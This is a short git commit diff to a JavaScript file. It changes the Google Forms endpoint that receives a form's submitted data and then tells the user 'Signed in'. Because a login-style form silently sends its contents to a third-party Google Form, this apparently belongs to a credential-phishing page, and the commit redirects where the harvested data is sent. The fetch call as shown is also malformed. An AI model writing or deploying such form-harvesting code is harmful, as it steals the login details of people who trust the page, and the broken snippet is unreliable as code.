a240ff0e420d05609de0440f87837e7a3388caf4
H4XO-999 <h4ck3r.999.999.999.999@gmail.com>
2025-02-13 04:24:47 +0100

    index.js

--- index.js
+++ index.js
@@ -4,7 +4,7 @@ document.getElementById("googleform").addEventListener("submit", function(event)
     let formData = new
         FormData(this);
 
-fetch("https://docs.google.com/forms/u/0/d/e/1FAIpQLScf1g3KcmavxDlVv3u6HWXx0tzox6dtI2ovIEHHnZ18ZswaBg/formResponse")
+fetch("https://docs.google.com/forms/u/0/d/e/1FAIpQLSeuIrXuZsHFo5calRABB43VFj8HGRipnXUL0W7kIG-AcrBOfA/formResponse")
     method: "POST",
         body: formData,
         mode: "no-cors"}). then(response => { alert("Signed in");
